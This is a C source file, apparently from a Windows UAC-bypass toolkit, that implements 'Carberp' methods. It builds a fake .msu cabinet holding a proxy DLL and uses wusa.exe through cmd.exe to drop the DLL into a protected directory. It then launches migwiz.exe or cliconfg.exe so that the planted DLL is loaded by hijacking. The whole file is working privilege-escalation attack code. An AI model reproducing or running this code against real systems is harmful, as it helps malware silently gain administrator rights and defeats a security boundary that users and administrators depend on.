/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2016
*
*  TITLE:       CARBERP.C
*
*  VERSION:     2.00
*
*  DATE:        16 Nov 2015
*
*  Tweaked Carberp methods.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"

/*
* ucmWusaExtractPackage
*
* Purpose:
*
* Extract cab to protected directory using wusa.
*
*/
BOOL ucmWusaExtractPackage(
	LPWSTR lpCommandLine
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	WCHAR szMsuFileName[MAX_PATH + 1];
	WCHAR szCmd[MAX_PATH * 4];

	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));

	do {

		if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
			szMsuFileName, MAX_PATH) == 0)
		{
			break;
		}

		//extract msu data to target directory
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
		bResult = supRunProcess(L"cmd.exe", szCmd);
		if (bResult == FALSE) {
			break;
		}

	} while (cond);

	if (szMsuFileName[0] != 0) {
		DeleteFileW(szMsuFileName);
	}
	return bResult;
}

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu package then run target application.
*
*/
BOOL ucmWusaMethod(
	UACBYPASSMETHOD Method,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	LPWSTR lpSourceDll, lpCommandLine, lpTargetProcess;
	WCHAR szCmd[MAX_PATH * 4];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0)
		)
	{
		return FALSE;
	}

	switch (Method) {

	//use migwiz.exe as target
	case UacMethodCarberp1:
		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
		lpCommandLine = METHOD_MIGWIZ_CMDLINE;
		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
		break;

	//use cliconfg.exe as target
	case UacMethodCarberp2:
		lpSourceDll = METHOD_SQLSRV_SOURCEDLL;
		lpCommandLine = METHOD_SQLSRV_CMDLINE;
		lpTargetProcess = METHOD_SQLSRV_TARGETAPP;
		break;

	default:
		return FALSE;
	}

	do {

		//
		// Extract file to the protected directory
		// First, create cab with fake msu ext, second run fusion process.
		//
		if (!ucmCreateCabinetForSingleFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
			break;
		}

		if (!ucmWusaExtractPackage(lpCommandLine)) {
			break;
		}

		//run target process for dll hijacking
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		if (ExpandEnvironmentStringsW(lpTargetProcess,
			szCmd, MAX_PATH) == 0)
		{
			break;
		}
		bResult = supRunProcess(szCmd, NULL);

	} while (cond);


	return bResult;
}

/*
* ucmCreateCabinetForSingleFile
*
* Purpose:
*
* Build cabinet for usage in methods where required 1 file.
*
*/
BOOL ucmCreateCabinetForSingleFile(
	LPWSTR lpSourceDll,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL cond = FALSE, bResult = FALSE;
	CABDATA *Cabinet = NULL;
	WCHAR szDllFileName[MAX_PATH + 1];
	WCHAR szMsuFileName[MAX_PATH + 1];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0)
		)
	{
		return FALSE;
	}

	do {

		//drop proxy dll
		RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
		if (ExpandEnvironmentStringsW(lpSourceDll,
			szDllFileName, MAX_PATH) == 0)
		{
			break;
		}
		if (!supWriteBufferToFile(szDllFileName, ProxyDll, ProxyDllSize)) {
			break;
		}

		//build cabinet
		RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
		if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
			szMsuFileName, MAX_PATH) == 0)
		{
			break;
		}
		Cabinet = cabCreate(szMsuFileName);
		if (Cabinet) {
			lpSourceDll = _filenameW(szDllFileName);
			//put file without compression
			bResult = cabAddFile(Cabinet, szDllFileName, lpSourceDll);
			cabClose(Cabinet);
		}
		else {
			break;
		}

	} while (cond);

	return bResult;
}
